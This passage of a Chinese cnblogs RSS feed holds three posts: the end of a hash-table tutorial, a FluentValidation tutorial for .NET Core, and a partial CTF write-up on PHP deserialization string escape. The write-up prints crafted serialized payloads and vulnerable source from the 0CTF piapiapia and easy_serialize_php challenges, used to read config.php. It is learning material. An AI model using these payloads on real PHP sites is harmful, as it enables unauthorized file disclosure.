        }

        int cnt;
        
        int OldTableSize = H-&amp;gt;TableSize;
        Cell *OldCells = H-&amp;gt;TheCells;
        HashTable newTable = InitializeTable(2 * OldTableSize);
        for (cnt = 0; cnt &amp;lt; OldTableSize; cnt++) {
                if (OldCells[cnt].Info == Legitimate) {
                        Insert(newTable, OldCells[cnt].Element);
                }
        }
        DestroyTable(H);
        return newTable;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;56-可扩散列&quot;&gt;5.6 可扩散列&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;如果数据量太大以至于装不进主存，可以考虑使用可扩散列。根据上一节的描述，如果表变得过满就要执行再散列，这样代价巨大，因为它需要O(N)次磁盘访问。而可扩散列允许两次磁盘访问执行一次Find，插入操作也需要很少的磁盘访问&lt;/li&gt;
&lt;li&gt;目录中的项数为2^D，dL为树叶L所有元素共有的最高位的位数，dL将依赖于特定的树叶，因此dL &amp;lt;= D&lt;/li&gt;
&lt;li&gt;如果树叶中的元素满了，即 = M，这时再插入就会分裂成两片树叶，目录也会更新大小。&lt;/li&gt;
&lt;li&gt;有可能一片树叶中的元素有多余D + 1个前导位相同时，需要多个目录分裂&lt;/li&gt;
&lt;li&gt;存在重复关键字的可能性，若存在多于M个重复关键字，则该苏纳法根本无效，此时需要做出其他的安排&lt;/li&gt;
&lt;li&gt;这些比特&lt;mark&gt;完全随机是相当重要&lt;/mark&gt;的，可以通过把这些关键字散列到合理长的整数来完成&lt;/li&gt;
&lt;li&gt;可扩散列的特性：基于合理假设即“位模式是均匀分布的”。
&lt;ol&gt;&lt;li&gt;树叶的期望个数为（N/M）log(2)e，因此平均树叶满的程度为ln2 = 0.69。这和B树是一样的&lt;/li&gt;
&lt;li&gt;目录的期望大小即2^D, 为O(N^(1+1/M)M)，如果M很小，那么目录可能过分的大。这种情况下，我们可以让树叶包含指向记录的指针而不是实际的记录，这样可以增加M的值，为了维持更小的目录，可以把第二个磁盘访问添加到每个Find操作中去，如果目录太大装不进主存，那么第二个磁盘访问怎么说也还是需要的&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;散列表可以在&lt;mark&gt;常数平均时间&lt;/mark&gt;实现Insert和Find操作&lt;/li&gt;
&lt;li&gt;使用散列表时，设置装填因子特别重要，否则时间界将不再有效&lt;/li&gt;
&lt;li&gt;当关键字不是短串或是整数时，仔细选择散列函数也是很重要的&lt;/li&gt;
&lt;li&gt;对于分离连接散列法，虽然装填因子比较小时性能不明显降低，但是装填因子还是应该&lt;mark&gt;接近1&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;对于开放定址散列法，除非完全不可避免，否则&lt;mark&gt;装填因子不应该超过0.5&lt;/mark&gt;。如果使用线性探测，那么性能随着装填因子接近于1而急速下降。再散列运算可以通过使表增长或收缩来实现，这样将会保持合理的装填因子。对于&lt;mark&gt;空间紧缺并且不可能声明巨大散列表的情况&lt;/mark&gt;，这是很重要的&lt;/li&gt;
&lt;li&gt;二叉查找树可以用来实现Insert &amp;amp; Find。虽然平均时间界为O(logN)，但是二叉查找树也支持那些&lt;mark&gt;需要序&lt;/mark&gt;的例程从而更实用。使用散列表不可能找出最小元素。除非准确知道一个字符串，否则散列表也不可能有效的查找它。而二叉查找树可以迅速找到在一定范围内的所有项，散列表是做不到的。不仅如此，O(logN)并不比O(1)大那么多，特别是因为&lt;mark&gt;查找树不需要乘法和除法&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;散列的最坏情况一般来自于实现的缺憾，而有序的输入却可能使二叉树运行的很差&lt;/mark&gt;。平衡查找树实现的代价很高。因此，如果不需要序的信息以及对输入是否被排序有怀疑，那么就应该选择散列这种数据结构&lt;/li&gt;
&lt;li&gt;散列的应用：
&lt;ol&gt;&lt;li&gt;编译器使用散列表跟踪源代码中声明的变量，即符号表。标识符一般都不长，因此其散列函数能够迅速被算出&lt;/li&gt;
&lt;li&gt;图论问题中节点有实际的名字而不是数字。而且输入很可能是一组一组依字母顺序排列的项。如果使用查找树则在效率方面可能会很低&lt;/li&gt;
&lt;li&gt;游戏中的变换表&lt;/li&gt;
&lt;li&gt;在线拼写检验程序&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;参考文献&quot;&gt;参考文献&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;Mark Allen Weiss.数据结构与算法分析[M].America, 2007&lt;/li&gt;
&lt;/ol&gt;&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;本文作者:&lt;/strong&gt; CrazyCatJack&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文链接:&lt;/strong&gt; &lt;a href=&quot;https://www.cnblogs.com/CrazyCatJack/p/13340018.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/CrazyCatJack/p/13340018.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;版权声明:&lt;/strong&gt;本博客所有文章除特别声明外，均采用 &lt;a href=&quot;https://creativecommons.org/licenses/by-nc-nd/4.0/&quot; target=&quot;_blank&quot;&gt;BY-NC-SA&lt;/a&gt; 许可协议。转载请注明出处！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关注博主:&lt;/strong&gt;如果您觉得该文章对您有帮助，可以点击文章右下角&lt;strong&gt;推荐&lt;/strong&gt;一下，您的支持将成为我最大的动力！&lt;/p&gt;
&lt;hr/&gt;</description>
<pubDate>Fri, 19 Feb 2021 15:53:00 +0000</pubDate>
<dc:creator>CrazyCatJack</dc:creator>
<og:description>散列表只支持二叉查找树所允许的一部分操作。散列是一种用于以常数平均时间执行插入、删除和查找的技术。但是，那些需要元素间任何排序信息的操作将不会得到有效的支持，例如FindMin、FindMax以及以线</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/CrazyCatJack/p/13340018.html</dc:identifier>
</item>
<item>
<title>在.NET Core 中使用 FluentValidation 进行规则验证 - SpringLeee</title>
<link>http://www.cnblogs.com/myshowtime/p/14418677.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/myshowtime/p/14418677.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://blog-1259586045.cos.ap-shanghai.myqcloud.com/2021.02.19.01.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;不用说，规则验证很重要，无效的参数，可能会导致程序的异常。&lt;/p&gt;
&lt;p&gt;如果使用Web API或MVC页面，那么可能习惯了自带的规则验证，我们的控制器很干净：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;public class User
{
        [Required]
        public string FirstName { get; set; }
        
        [Required]
        public string LastName { get; set; }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这种很常见，但是今天我想给你一个更好的替代方案：FluentValidation， 通过这个库，您可以流畅地定义用于对象验证的复杂规则，从而轻松构建和理解验证规则，您可以在 &lt;a target=&quot;_blank&quot;&gt;Github&lt;/a&gt; 上找到这个项目。&lt;/p&gt;

&lt;p&gt;我新建了一个很简单的.NET Core 的Web API 程序，只有一个接口是用户注册，入参是一个User类, 然后在Nuget中安装 &lt;code&gt;FluentValidation&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;创建第一个验证&quot;&gt;创建第一个验证&lt;/h2&gt;
&lt;p&gt;对于要验证的每个类，必须创建其自己的验证器，每个验证器类都必须继承&lt;code&gt;AbstractValidator&amp;lt;T&amp;gt;&lt;/code&gt;，其中T是要验证的类,并且所有验证规则都在构造函数中定义。&lt;/p&gt;
&lt;p&gt;最简单的验证是针对空值，如果要指定FirstName和LastName都不能为空，这个验证器是这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;public class UserValidator : AbstractValidator&amp;lt;User&amp;gt;
{
        public UserValidator()
        {
                RuleFor(x =&amp;gt; x.FirstName).NotEmpty();
                RuleFor(x =&amp;gt; x.LastName).NotEmpty();
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;就这些了，您已经创建了第一个验证器，是不是超级简单！&lt;/p&gt;
&lt;p&gt;还有一些其他的规则，比如 MinimumLength，MaximumLength和Length，用于验证长度，您可以把多个规则指定到一个字段，就像这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;public class UserValidator : AbstractValidator&amp;lt;User&amp;gt;
{
        public UserValidator()
        {
                RuleFor(x =&amp;gt; x.FirstName).NotEmpty();
                RuleFor(x =&amp;gt; x.FirstName).MinimumLength(3);
        RuleFor(x =&amp;gt; x.FirstName).MaximumLength(20);
                
                RuleFor(x =&amp;gt; x.LastName).NotEmpty();
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;验证入参&quot;&gt;验证入参&lt;/h2&gt;
&lt;p&gt;我们之前已经定义了验证规则，现在开始使用它，您只需要new 一个UserValidator对象，然后调用Validate方法, 它会返回一个对象，其中包含了验证状态和所有没有通过验证的信息。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;[HttpPost]
public IActionResult Register(User newUser)
{
        var validator = new UserValidator();
        var validationResult = validator.Validate(newUser);
        
        if (!validationResult.IsValid)
        {
                return BadRequest(validationResult.Errors.First().ErrorMessage);
        }

        return Ok();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果我运行程序，然后输入一个超长的名字：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;{
    &quot;FirstName&quot;: &quot;赵钱孙李周吴郑王冯陈褚卫蒋沈韩杨朱秦尤许何吕施张&quot;,
    &quot;LastName&quot;: &quot;张&quot;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我会收到验证错误：&quot;The length of 'First Name' must be 20 characters or fewer. You entered 24 characters&quot;。&lt;/p&gt;
&lt;p&gt;好吧，我不喜欢这个消息，那么你可以自定义错误消息，这很简单，您可以使用 WithMessage 方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;- RuleFor(x =&amp;gt; x.FirstName).MaximumLength(20);
+ RuleFor(x =&amp;gt; x.FirstName).MaximumLength(20).WithMessage(&quot;您的名字长度已经超出了限制!&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;流利验证&quot;&gt;流利验证&lt;/h2&gt;
&lt;p&gt;你可以把验证规则，改成下边这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;- RuleFor(x =&amp;gt; x.FirstName).NotEmpty();
- RuleFor(x =&amp;gt; x.FirstName).MinimumLength(3);
+ RuleFor(x =&amp;gt; x.FirstName).NotEmpty().MinimumLength(3);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后也可以把验证规则应用于其他的属性，就像这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;public UserValidator()
{
        RuleFor(x =&amp;gt; x.FirstName)
                .MaximumLength(20).WithMessage(&quot;您的名字长度已经超出了限制!&quot;)
                .NotEmpty().MinimumLength(3);

        RuleFor(x =&amp;gt; x.LastName).NotEmpty();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;常见的验证规则&quot;&gt;常见的验证规则&lt;/h2&gt;
&lt;p&gt;这个库有很多现成的基本类型验证规则, 对于字符串，您可以使用不同的方法，比如 EmailAddress，IsEnumName（检查值是否在指定的Enum类型中定义）和 InclusiveBetween, 检查该值是否在定义的范围内。&lt;/p&gt;
&lt;p&gt;现在，我在User类添加了另外两个字段，Password 和 ConfirmPassword。&lt;/p&gt;
&lt;p&gt;Password字段是一个字符串，有效的长度必须在5到15个字符之间，并且要符合正则，为了定义是否满足安全规则，我定义了一个HasValidPassword方法，它会返回一个bool值。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;private bool HasValidPassword(string pw)
{
        var lowercase = new Regex(&quot;[a-z]+&quot;);
        var uppercase = new Regex(&quot;[A-Z]+&quot;);
        var digit = new Regex(&quot;(\\d)+&quot;);
        var symbol = new Regex(&quot;(\\W)+&quot;);

        return (lowercase.IsMatch(pw) &amp;amp;&amp;amp; uppercase.IsMatch(pw) &amp;amp;&amp;amp; digit.IsMatch(pw) &amp;amp;&amp;amp; symbol.IsMatch(pw));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后在密码验证中使用：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;RuleFor(x =&amp;gt; x.FirstName)
        .MaximumLength(20).WithMessage(&quot;您的名字长度已经超出了限制!&quot;)
        .NotEmpty().MinimumLength(3);

RuleFor(x =&amp;gt; x.LastName).NotEmpty();

RuleFor(x =&amp;gt; x.Password)
        .Length(5, 15)
        .Must(x =&amp;gt; HasValidPassword(x));
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;还可以简化一些：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;RuleFor(x =&amp;gt; x.Password)
                        .Length(5, 15)
-                       .Must(x =&amp;gt; HasValidPassword(x));
+                       .Must(HasValidPassword);
        }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ConfirmPassword字段的唯一要求是等于Password字段:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;RuleFor(x =&amp;gt; x.ConfirmPassword)
        .Equal(x =&amp;gt; x.Password)
        .WithMessage(&quot;2次密码不一致！&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;注入验证器&quot;&gt;注入验证器&lt;/h2&gt;
&lt;p&gt;修改Startup类中的ConfigureServices方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;public void ConfigureServices(IServiceCollection services)
{
        services.AddControllers().AddFluentValidation();

        services.AddTransient&amp;lt;IValidator&amp;lt;User&amp;gt;, UserValidator&amp;gt;();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注意：这个地方的生命周期是 Transient。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这样，在调用注册接口的时候，会自动进行规则验证：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;[HttpPost]
public IActionResult Register(User newUser)
{
        return Ok();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后，我们再尝试传入参数来调用接口：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;{
    &quot;FirstName&quot;: &quot;赵钱孙李周吴郑王冯陈褚卫蒋沈韩杨朱秦尤许何吕施张&quot;,
    &quot;LastName&quot;: &quot;张&quot;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;很明显，验证不通过，接口会返回这样的错误信息：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;{
    &quot;type&quot;: &quot;https://tools.ietf.org/html/rfc7231#section-6.5.1&quot;,
    &quot;title&quot;: &quot;One or more validation errors occurred.&quot;,
    &quot;status&quot;: 400,
    &quot;traceId&quot;: &quot;|c4523c02-4899b7f3df86a629.&quot;,
    &quot;errors&quot;: { 
        &quot;FirstName&quot;: [
            &quot;您的名字长度已经超出了限制!&quot;
        ]
    }
}
 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;希望对您有帮助，您可以在官方文档中找到更多的用法。&lt;/p&gt;
&lt;blockquote readability=&quot;1.3114754098361&quot;&gt;
&lt;p&gt;原文链接： &lt;a target=&quot;_blank&quot;&gt;https://www.code4it.dev/blog/fluentvalidation&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;最后&quot;&gt;最后&lt;/h3&gt;
&lt;p&gt;欢迎扫码关注我们的公众号 【全球技术精选】，专注国外优秀博客的翻译和开源项目分享，也可以添加QQ群 897216102&lt;/p&gt;
&lt;img src=&quot;https://blog-1259586045.cos.ap-shanghai.myqcloud.com/wechat-logo2.png&quot;/&gt;</description>
<pubDate>Fri, 19 Feb 2021 15:14:00 +0000</pubDate>
<dc:creator>SpringLeee</dc:creator>
<og:description>不用说，规则验证很重要，无效的参数，可能会导致程序的异常。 如果使用Web API或MVC页面，那么可能习惯了自带的规则验证，我们的控制器很干净： public class User { [Requi</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/myshowtime/p/14418677.html</dc:identifier>
</item>
<item>
<title>PHP反序列化字符串逃逸 - Pan3a</title>
<link>http://www.cnblogs.com/Pan3a/p/14418641.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Pan3a/p/14418641.html</guid>
<description>&lt;ul&gt;&lt;li&gt;通过&lt;code&gt;CTF&lt;/code&gt;比赛了解&lt;code&gt;PHP&lt;/code&gt;反序列化，记录自己的学习。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;借用哈大佬们的名言&quot;&gt;借用哈大佬们的名言&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;任何具有一定结构的数据，&lt;strong&gt;如果经过了某些处理而把结构体本身的结构给打乱了&lt;/strong&gt;，则有可能会产生漏洞。&lt;/li&gt;
&lt;li&gt;0CTF 2016piapiapia-----反序列化后长度递增&lt;/li&gt;
&lt;li&gt;安询杯2019-easy_serialize_php-----反序列化后长度递减&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;0ctf-2016piapiapia&quot;&gt;0CTF 2016piapiapia&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;由于是代码审计,直接访问&lt;code&gt;www.zip&lt;/code&gt;发现备份的源码,有一下文件,flag就在&lt;code&gt;config.php&lt;/code&gt;,因此读取即可&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;class.php         //主要有mysql类(mysql基本操作)和user类(继承mysql实现功能点)
config.php        //环境配置
index.php         //登陆
profile.php       //查看自己上传的文件
register.php      //注册
update.php        //文件上传
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;源码分析&quot;&gt;源码分析&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;然后分析代码,我喜欢通过功能点来分析,既然有注册,登陆,那么自然来看看&lt;code&gt;SQL&lt;/code&gt;咯,发现&lt;code&gt;class.php&lt;/code&gt;中&lt;code&gt;mysql&lt;/code&gt;类的filter过滤函数,过滤了增删查改,基本无望.&lt;/li&gt;
&lt;li&gt;后面就看看文件上传,发现也对上传的文件参数进行了限制,但是发现对文件进行了序列化处理,那么肯定有反序列化,在&lt;code&gt;profile.php&lt;/code&gt;中发现对上传的文件进行反序列化处理,并对文件&lt;code&gt;$profile['photo']&lt;/code&gt;进行读取.我们再回到文件上传点,发现&lt;code&gt;$profile['photo'] = 'upload/' . md5($file['name']);&lt;/code&gt;,但是我们无法获取加密后的文件值,后面有又看到&lt;span&gt;文件上传是先序列化,再进过&lt;code&gt;filter&lt;/code&gt;函数替换一些关键字,再反序列化&lt;/span&gt;,因此文件可能发生改变,因此可能有漏洞&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;payload构造&quot;&gt;payload构造&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;我们知道,PHP反序列化时以&lt;code&gt;;&lt;/code&gt;作为分隔点,&lt;code&gt;}&lt;/code&gt;做为结束标志,根据长度来判断读取多少字符,我们无法控制&lt;code&gt;$profile['photo']&lt;/code&gt;但是可以控制&lt;code&gt;nickname&lt;/code&gt;,而&lt;code&gt;nickname&lt;/code&gt;又进行了长度限制,&lt;code&gt;strlen&lt;/code&gt;函数却无法处理数组,因此用&lt;span&gt;数组进行绕过&lt;/span&gt;即可我们在这里截断,那么后面的则会被废弃不再读取,而我们要构造的的payload是,最开始的&lt;code&gt;&quot;;}&lt;/code&gt;是为了闭合前面数组&lt;code&gt;nickname&lt;/code&gt;的&lt;code&gt;{&lt;/code&gt;,后面的&lt;code&gt;;}&lt;/code&gt;是为了截断,让反序列化结束,不再读取后面的内容,当然这些都不能是字符哈.&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这时构造了&lt;code&gt;payload&lt;/code&gt;,那么就要来计算溢出数量了,我们构造的&lt;span&gt;payload长度为34&lt;/span&gt;,那么就要增加34个长度,由于&lt;code&gt;where&lt;/code&gt;变成&lt;code&gt;hacker&lt;/code&gt;会增加一个长度,那么我们就需要34个&lt;code&gt;where&lt;/code&gt;,最终payload&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;原理解析&quot;&gt;原理解析&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php

function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}

$profile = array(
    'phone'=&amp;gt;'01234567890',
    'email'=&amp;gt;'12345678@11.com',
    'nickname'=&amp;gt;array('wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}'),
    'photo'=&amp;gt;'upload/'.md5('1.jpg')
);
print_r(serialize($profile));
echo PHP_EOL;
print_r(filter(serialize($profile)));
echo PHP_EOL;
var_dump(unserialize(filter(serialize($profile))));
echo PHP_EOL;
?&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;输出结果展示,最开始不用进过&lt;code&gt;filter&lt;/code&gt;函数反序列化时,&lt;code&gt;nickname&lt;/code&gt;数组的第一个值没被截断是一个整体&lt;span&gt;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}&lt;/span&gt;,刚好204个长度,经过filter过滤函数后,&lt;code&gt;where&lt;/code&gt;变成了&lt;code&gt;hacker&lt;/code&gt;,反序列化的长度变化了,但是又只读取204的长度,则&lt;span&gt;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}&quot;;}&lt;/span&gt;就多出来了,作为另一个反序列化的其中一个元素,而末尾的&lt;code&gt;'}&lt;/code&gt;又不是字符,因此被认为反序列化结束了,后面的内容被丢弃,因此可以任意读取文件.&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;a:4:{s:5:&quot;phone&quot;;s:11:&quot;01234567890&quot;;s:5:&quot;email&quot;;s:15:&quot;12345678@11.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/f3ccdd27d2000e3f9255a7e3e2c48800&quot;;}

a:4:{s:5:&quot;phone&quot;;s:11:&quot;01234567890&quot;;s:5:&quot;email&quot;;s:15:&quot;12345678@11.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/f3ccdd27d2000e3f9255a7e3e2c48800&quot;;}

array(4) {
  'phone' =&amp;gt;
  string(11) &quot;01234567890&quot;
  'email' =&amp;gt;
  string(15) &quot;12345678@11.com&quot;
  'nickname' =&amp;gt;
  array(1) {
    [0] =&amp;gt;
    string(204) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;
  }
  'photo' =&amp;gt;
  string(10) &quot;config.php&quot;
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;安询杯2019-easy_serialize_php&quot;&gt;安询杯2019-easy_serialize_php&lt;/h2&gt;
&lt;h3 id=&quot;源码&quot;&gt;源码&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION[&quot;user&quot;] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '&amp;lt;a href=&quot;index.php?f=highlight_file&quot;&amp;gt;source_code&amp;lt;/a&amp;gt;';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;分析&quot;&gt;分析&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;源码不多,我就习惯先通读一遍再回溯可能出现的漏洞点,找可控参数.通读完全发现可能存在的漏洞点:&lt;code&gt;extract&lt;/code&gt;变量覆盖,&lt;code&gt;file_get_contents&lt;/code&gt;任意文件读取.&lt;/li&gt;
&lt;li&gt;将变量&lt;code&gt;$userinfo['img']&lt;/code&gt;逆推回去发现,是由参数&lt;code&gt;img_path&lt;/code&gt;控制的,但是经过&lt;code&gt;sha1&lt;/code&gt;加密,我们无法得知加密后内容,但结合前面的&lt;code&gt;extract&lt;/code&gt;变量覆盖,我们可以自己POST构造.&lt;/li&gt;
&lt;li&gt;构造了之后,会经过序列化&lt;code&gt;filter&lt;/code&gt;函数替换一些字符(&lt;span&gt;那么此时序列化后的数据则发生了变化,可能存在漏洞&lt;/span&gt;),再反序列化,读取参数值.&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;payload构造-1&quot;&gt;payload构造&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;我们任然利用序列化,经过过滤后长度发生变化来构造payload,首先明白序列化后,有三个元素,分别是&lt;code&gt;img&lt;/code&gt;,&lt;code&gt;user&lt;/code&gt;,&lt;code&gt;function&lt;/code&gt;,而我们能控制的只有后面两个,我们需要构造的payload是这样的&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;f&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;但是不经任何改变则是这样的&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-php&quot;&gt;a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:40:&quot;1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5&quot;;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;我还是利用截断的思想不让其读取元素&lt;code&gt;img&lt;/code&gt;的值,我们自己来构造这个值,只有两个参数,必须在&lt;code&gt;function&lt;/code&gt;哪里截断,而这个反序列是长度递减,那么就是选择元素吞噬(&lt;span&gt;吞噬的长度自己酌情参考,一般是到自己能控制的点就好&lt;/span&gt;)后面的长度,来构造自己的payload咯,我们就选&lt;code&gt;user&lt;/code&gt;元素吧,&lt;code&gt;len('&quot;;s:8:&quot;function&quot;;s:10:&quot;'&lt;/code&gt;)的长度为23,但是我们无法构造23个长度,我们可以多吞噬一个,24个字符,那么就用&lt;code&gt;6个flag&lt;/code&gt;就好,但是这样后面的序列化就混乱了,我们就要添加自己的payload,并补全.虽然这样补好了,但是只有两个元素,这里需要三个元素,我们就再添加元素,并将后面的&lt;code&gt;img&lt;/code&gt;进行截断&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
